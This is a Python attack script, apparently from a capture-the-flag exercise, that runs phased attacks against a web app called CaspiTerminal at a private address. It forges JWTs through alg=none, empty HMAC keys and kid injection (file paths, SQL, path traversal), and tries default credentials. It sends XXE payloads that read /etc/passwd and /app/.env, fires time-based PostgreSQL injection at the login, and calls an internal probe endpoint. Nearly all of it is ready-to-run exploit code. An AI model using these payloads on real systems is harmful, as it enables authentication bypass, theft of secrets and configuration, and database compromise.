#!/usr/bin/env python3
"""round27_recon_new.py — Full recon on new CaspiTerminal instance 192.168.242.102:8007"""
import requests, time, json, hmac as hm, hashlib, base64, sys

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_devnull(role="operator", sub="ctf", company="X"):
    """JWT with kid=/dev/null (old bypass)"""
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'',m.encode(),hashlib.sha256).digest())

def jwt_none(role="operator", sub="ctf", company="X"):
    """JWT with alg=none (no signature)"""
    h = json.dumps({"alg":"none","typ":"JWT"},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    return b64u(h)+'.'+b64u(p)+'.'

def jwt_hs256_empty(role="operator", sub="ctf", company="X"):
    """JWT with HS256 and empty string key (no kid)"""
    h = json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'',m.encode(),hashlib.sha256).digest())

def jwt_devzero(role="operator", sub="ctf", company="X"):
    """JWT with kid=/dev/zero"""
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/zero"},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    sig = hm.new(b'\x00'*1, m.encode(), hashlib.sha256).digest()
    return m+'.'+b64u(sig)

def jwt_proc(role="operator", sub="ctf", company="X"):
    """JWT with kid=/proc/self/environ (empty if no match)"""
    for kid_path in ["/dev/null", "/dev/zero", "/proc/self/environ",
                     "/dev/stdin", "/etc/hostname", "/dev/urandom"]:
        h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid_path},separators=(',',':')).encode()
        p = json.dumps({"sub":sub,"company":company,"role":role,
            "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
        m = b64u(h)+'.'+b64u(p)
        sig = hm.new(b'',m.encode(),hashlib.sha256).digest()
        yield kid_path, m+'.'+b64u(sig)

def req(method, path, **kw):
    try:
        r = S.request(method, f"{CASPI}{path}", timeout=10, **kw)
        return r.status_code, r.text[:500], r.headers
    except Exception as e:
        return -1, str(e)[:200], {}

# ============================================================
print("="*70)
print("PHASE 1: BASIC CONNECTIVITY")
print("="*70)

for path in ["/", "/login", "/ops", "/ops/custody", "/ops/diagnostics",
             "/api/auth/login", "/api/ops/probe/sign", "/api/ops/custody/ingest",
             "/api/ops/probe", "/api/health", "/api/status",
             "/admin", "/api/admin", "/api/config",
             "/api/ops/llehs", "/api/ops/valve", "/api/ops/emergency"]:
    code, body, hdrs = req("GET", path)
    title = ""
    if "<title>" in body:
        start = body.index("<title>") + 7
        end = body.index("</title>", start) if "</title>" in body[start:] else start+50
        title = body[start:end]
    ct = hdrs.get("Content-Type","")[:30] if hdrs else ""
    print(f"  GET {path:40s} [{code}] {title or body[:60]} ({ct})")

print("\n--- POST endpoints ---")
for path in ["/api/auth/login", "/api/ops/probe", "/api/ops/custody/ingest"]:
    code, body, _ = req("POST", path, json={})
    print(f"  POST {path:40s} [{code}] {body[:80]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: JWT BYPASS TESTS")
print("="*70)

# Test various JWT strategies
print("  Testing JWT bypass methods on /ops/diagnostics ...")

# 1. No auth
code, body, _ = req("GET", "/ops/diagnostics")
print(f"  No auth: [{code}] {body[:60]}")

# 2. kid=/dev/null (old method)
for role in ["operator", "admin", "superadmin"]:
    token = jwt_devnull(role=role)
    code, body, _ = req("GET", "/ops/diagnostics",
        headers={"Authorization": f"Bearer {token}"})
    title = ""
    if "<title>" in body:
        start = body.index("<title>") + 7
        end = body.index("</title>", start) if "</title>" in body[start:] else start+50
        title = body[start:end]
    print(f"  kid=/dev/null role={role:12s}: [{code}] {title or body[:60]}")

# 3. alg=none
token = jwt_none()
code, body, _ = req("GET", "/ops/diagnostics",
    headers={"Authorization": f"Bearer {token}"})
print(f"  alg=none: [{code}] {body[:60]}")

# 4. HS256 empty key no kid
token = jwt_hs256_empty()
code, body, _ = req("GET", "/ops/diagnostics",
    headers={"Authorization": f"Bearer {token}"})
print(f"  HS256 empty key (no kid): [{code}] {body[:60]}")

# 5. Various kid paths
for kid_path, token in jwt_proc():
    code, body, _ = req("GET", "/ops/diagnostics",
        headers={"Authorization": f"Bearer {token}"})
    print(f"  kid={kid_path:25s}: [{code}] {body[:50]}")

# 6. kid with SQL injection
for kid_val in ["' UNION SELECT '' --", "' OR '1'='1", "../../../dev/null"]:
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid_val},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"admin",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    sig = hm.new(b'',m.encode(),hashlib.sha256).digest()
    token = m+'.'+b64u(sig)
    code, body, _ = req("GET", "/ops/diagnostics",
        headers={"Authorization": f"Bearer {token}"})
    print(f"  kid={kid_val:30s}: [{code}] {body[:50]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 3: LOGIN EXPLORATION")
print("="*70)

# Get login page
code, body, _ = req("GET", "/login")
print(f"  GET /login: [{code}]")
# Look for form action, hidden fields, etc.
if "form" in body.lower():
    # Extract form details
    import re
    actions = re.findall(r'action=["\']([^"\']+)', body)
    inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', body)
    print(f"    Form actions: {actions}")
    print(f"    Input names: {inputs}")

# Try login with various credentials
creds = [
    ("ops@caspiterminal.kz", "admin"),
    ("admin@caspiterminal.kz", "admin"),
    ("operator@caspiterminal.kz", "operator"),
    ("admin", "admin"),
    ("ops", "ops"),
]

for email, pw in creds:
    code, body, hdrs = req("POST", "/api/auth/login", json={"email":email, "password":pw})
    sc = hdrs.get("Set-Cookie","")[:60] if hdrs else ""
    print(f"  {email}:{pw} → [{code}] {body[:60]} {sc}")

# Try form-encoded
for email, pw in [("ops@caspiterminal.kz", "admin")]:
    code, body, hdrs = req("POST", "/api/auth/login", data={"email":email, "password":pw})
    print(f"  form-encoded {email}:{pw} → [{code}] {body[:60]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: XXE ON NEW INSTANCE")
print("="*70)

def xxe(path, field="remarks", token=None):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    hdrs = {"Content-Type":"application/xml"}
    if token:
        hdrs["Authorization"] = f"Bearer {token}"
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest", data=xml, headers=hdrs, timeout=15)
        return r.status_code, r.text[:300]
    except Exception as e:
        return -1, str(e)[:100]

# Test XXE with different auth methods
print("  XXE without auth:")
code, body = xxe("/etc/passwd")
print(f"    [{code}] {body[:100]}")

print("  XXE with kid=/dev/null JWT:")
code, body = xxe("/etc/passwd", token=jwt_devnull("admin"))
print(f"    [{code}] {body[:100]}")

print("  XXE with alg=none JWT:")
code, body = xxe("/etc/passwd", token=jwt_none("admin"))
print(f"    [{code}] {body[:100]}")

# If any XXE works, read key files
if code == 200 and "parsed" in body:
    print("\n  XXE works! Reading key files...")
    for fpath in ["/etc/passwd", "/app/db.py", "/app/requirements.txt",
                  "/proc/self/status", "/app/.env", "/app/config.py"]:
        c, b = xxe(fpath, token=jwt_devnull("admin"))
        if "parsed" in b:
            try:
                d = json.loads(b)
                val = d.get("summary",{}).get("remarks","")
                if val and val != "R":
                    print(f"    {fpath}: {val[:200]}")
            except:
                pass

# ============================================================
print("\n"+"="*70)
print("PHASE 5: PROBE ENDPOINT")
print("="*70)

# Test probe sign with different auth
for label, token in [("no auth", None), ("devnull", jwt_devnull("operator")),
                     ("devnull admin", jwt_devnull("admin")), ("alg=none", jwt_none())]:
    hdrs = {}
    if token:
        hdrs["Authorization"] = f"Bearer {token}"
    code, body, _ = req("GET", "/api/ops/probe/sign?device=lm-01", headers=hdrs)
    print(f"  sign lm-01 ({label}): [{code}] {body[:80]}")

# Try probe POST
for label, token in [("no auth", None), ("devnull", jwt_devnull("operator"))]:
    hdrs = {"Content-Type": "application/json"}
    if token:
        hdrs["Authorization"] = f"Bearer {token}"
    code, body, _ = req("POST", "/api/ops/probe",
        headers=hdrs,
        json={"url":"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
              "sig":"5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"})
    print(f"  probe POST ({label}): [{code}] {body[:100]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 6: NEW ENDPOINT DISCOVERY")
print("="*70)

# Scan for new endpoints
paths_to_try = [
    "/api/v1/", "/api/v2/", "/api/ops/", "/api/admin/",
    "/api/ops/llehs", "/api/ops/valve", "/api/ops/valves",
    "/api/ops/emergency", "/api/ops/tanks", "/api/ops/meters",
    "/api/ops/devices", "/api/ops/config", "/api/ops/settings",
    "/api/ops/users", "/api/ops/roles", "/api/ops/secrets",
    "/api/auth/register", "/api/auth/forgot", "/api/auth/reset",
    "/api/auth/token", "/api/auth/refresh", "/api/auth/me",
    "/api/auth/session", "/api/auth/whoami",
    "/swagger", "/swagger.json", "/openapi.json", "/api/docs",
    "/robots.txt", "/sitemap.xml", "/.env", "/debug",
    "/api/flag", "/flag", "/api/ops/flag",
    "/healthz", "/ready", "/metrics",
    "/static/js/app.js", "/static/js/main.js",
    "/static/js/diagnostics.js", "/static/js/custody.js",
]

for p in paths_to_try:
    code, body, _ = req("GET", p, headers={"Authorization": f"Bearer {jwt_devnull('admin')}"})
    if code not in [-1, 404, 405]:
        short = body[:60].replace("\n"," ")
        print(f"  {p:45s} [{code}] {short}")

# ============================================================
print("\n"+"="*70)
print("PHASE 7: RESPONSE HEADER ANALYSIS")
print("="*70)

# Check response headers for clues
code, body, hdrs = req("GET", "/")
if hdrs:
    for k, v in hdrs.items():
        if k.lower() not in ['date', 'content-length']:
            print(f"  {k}: {v}")

# Check login response headers
code, body, hdrs = req("POST", "/api/auth/login",
    json={"email":"ops@caspiterminal.kz","password":"admin"})
if hdrs:
    print(f"\n  Login response headers:")
    for k, v in hdrs.items():
        if k.lower() not in ['date', 'content-length']:
            print(f"    {k}: {v}")

# ============================================================
print("\n"+"="*70)
print("PHASE 8: SQLi RE-CHECK WITH VARIANTS")
print("="*70)

# Maybe the query format changed. Try different injection styles.
payloads = [
    ("stacked sleep(3)", "x'; SELECT pg_sleep(3)--"),
    ("inline sleep OR", "x' OR pg_sleep(3)::text='1'--"),
    ("inline sleep AND", "' AND pg_sleep(3) IS NOT NULL--"),
    ("subquery sleep", "' AND (SELECT pg_sleep(3)) IS NOT NULL--"),
    ("UNION sleep", "' UNION SELECT pg_sleep(3)--"),
    ("double quote", 'x"; SELECT pg_sleep(3)--'),
    ("backslash", "x\\'; SELECT pg_sleep(3)--"),
    ("email stacked", None),  # will test in email field
]

for label, pay in payloads:
    if pay is None:
        # Email field injection
        t0 = time.time()
        try:
            r = S.post(f"{CASPI}/api/auth/login",
                json={"email":"x'; SELECT pg_sleep(3)--","password":"x"}, timeout=10)
            t = time.time()-t0
            print(f"  {label:25s}: {t:.2f}s [{r.status_code}] {r.text[:40]}")
        except:
            print(f"  {label:25s}: {time.time()-t0:.2f}s [err]")
    else:
        t0 = time.time()
        try:
            r = S.post(f"{CASPI}/api/auth/login",
                json={"email":"ops@caspiterminal.kz","password":pay}, timeout=10)
            t = time.time()-t0
            print(f"  {label:25s}: {t:.2f}s [{r.status_code}] {r.text[:40]}")
        except requests.exceptions.Timeout:
            t = time.time()-t0
            print(f"  {label:25s}: {t:.2f}s [TIMEOUT!] <<<")
        except:
            print(f"  {label:25s}: {time.time()-t0:.2f}s [err]")

# ============================================================
print("\n"+"="*70)
print("PHASE 9: FULL LOGIN PAGE ANALYSIS")
print("="*70)

# Get the full login page HTML
code, body, _ = req("GET", "/login")
if code == 200:
    # Look for JS includes, hidden fields, CSRF tokens
    import re
    scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)', body)
    links = re.findall(r'<link[^>]*href=["\']([^"\']+)', body)
    forms = re.findall(r'<form[^>]*>(.*?)</form>', body, re.DOTALL)
    metas = re.findall(r'<meta[^>]+content=["\']([^"\']+)["\'][^>]*>', body)

    print(f"  Scripts: {scripts}")
    print(f"  Links: {links}")
    print(f"  Metas: {metas[:5]}")

    if forms:
        for i, form in enumerate(forms):
            print(f"  Form {i}: {form[:200]}")

    # Print full body for analysis
    print(f"\n  Full login page ({len(body)} bytes):")
    print(f"  {body}")

print("\n"+"="*70)
print("DONE")
print("="*70)
